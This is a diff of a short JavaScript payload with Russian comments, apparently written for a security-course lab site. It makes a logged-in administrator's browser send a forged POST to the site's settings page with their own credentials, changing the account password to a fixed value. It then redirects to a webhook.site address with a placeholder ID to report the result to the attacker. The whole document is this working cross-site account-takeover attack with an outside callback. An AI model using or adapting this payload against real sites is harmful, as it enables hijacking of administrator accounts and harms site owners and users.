@@ -1,12 +1,18 @@
 <script>
-// Заставляем админа выполнить действие вместо нас
+// Создаем FormData
+var formData = new FormData();
+formData.append('password', 'Abcdef_1234567');
+formData.append('confirm-password', 'Abcdef_1234567');
+
 fetch('https://cats.is-course.ru/settings', {
     method: 'POST',
     credentials: 'include',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        password: 'Abcdef_1234567',
-        confirm-password: 'Abcdef_1234567'
-    })
+    body: formData
+}).then(r => {
+    if(r.ok) {
+        window.location = "https://webhook.site/ТВОЙ_ID?success=true";
+    } else {
+        window.location = "https://webhook.site/ТВОЙ_ID?error=" + r.status;
+    }
 });
 </script>
